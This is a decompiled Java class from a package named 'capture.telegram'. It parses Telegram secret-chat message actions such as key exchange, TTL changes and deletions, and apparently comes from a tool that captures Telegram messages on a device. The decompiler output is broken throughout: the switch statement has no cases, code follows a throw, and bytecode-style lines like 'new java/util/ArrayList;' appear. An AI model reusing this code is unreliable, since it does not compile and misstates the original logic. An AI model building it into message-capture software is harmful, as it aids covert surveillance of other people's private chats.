package com.vvt.capture.telegram.internal;

import java.util.ArrayList;

public class TLRPC$DecryptedMessageAction
  extends TLObject
{
  public TLRPC.SendMessageAction action;
  public int end_seq_no;
  public long exchange_id;
  public byte[] g_a;
  public byte[] g_b;
  public long key_fingerprint;
  public int layer;
  public ArrayList random_ids;
  public int start_seq_no;
  public int ttl_seconds;
  
  public TLRPC$DecryptedMessageAction()
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.random_ids = localArrayList;
  }
  
  public static DecryptedMessageAction TLdeserialize(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    Object localObject = null;
    switch (paramInt)
    {
    }
    while ((localObject == null) && (paramBoolean))
    {
      localObject = new java/lang/RuntimeException;
      Object[] arrayOfObject = new Object[1];
      Integer localInteger = Integer.valueOf(paramInt);
      arrayOfObject[0] = localInteger;
      String str = String.format("can't parse magic %x in DecryptedMessageAction", arrayOfObject);
      ((RuntimeException)localObject).<init>(str);
      throw ((Throwable)localObject);
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_decryptedMessageActionSetMessageTTL;
      ((TLRPC.TL_decryptedMessageActionSetMessageTTL)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_decryptedMessageActionNotifyLayer;
      ((TLRPC.TL_decryptedMessageActionNotifyLayer)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_decryptedMessageActionDeleteMessages;
      ((TLRPC.TL_decryptedMessageActionDeleteMessages)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_decryptedMessageActionCommitKey;
      ((TLRPC.TL_decryptedMessageActionCommitKey)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_decryptedMessageActionAbortKey;
      ((TLRPC.TL_decryptedMessageActionAbortKey)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_decryptedMessageActionFlushHistory;
      ((TLRPC.TL_decryptedMessageActionFlushHistory)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_decryptedMessageActionTyping;
      ((TLRPC.TL_decryptedMessageActionTyping)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_decryptedMessageActionAcceptKey;
      ((TLRPC.TL_decryptedMessageActionAcceptKey)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_decryptedMessageActionReadMessages;
      ((TLRPC.TL_decryptedMessageActionReadMessages)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_decryptedMessageActionResend;
      ((TLRPC.TL_decryptedMessageActionResend)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_decryptedMessageActionRequestKey;
      ((TLRPC.TL_decryptedMessageActionRequestKey)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_decryptedMessageActionScreenshotMessages;
      ((TLRPC.TL_decryptedMessageActionScreenshotMessages)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_decryptedMessageActionNoop;
      ((TLRPC.TL_decryptedMessageActionNoop)localObject).<init>();
    }
    if (localObject != null) {
      ((DecryptedMessageAction)localObject).readParams(paramAbstractSerializedData, paramBoolean);
    }
    return (DecryptedMessageAction)localObject;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$DecryptedMessageAction.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */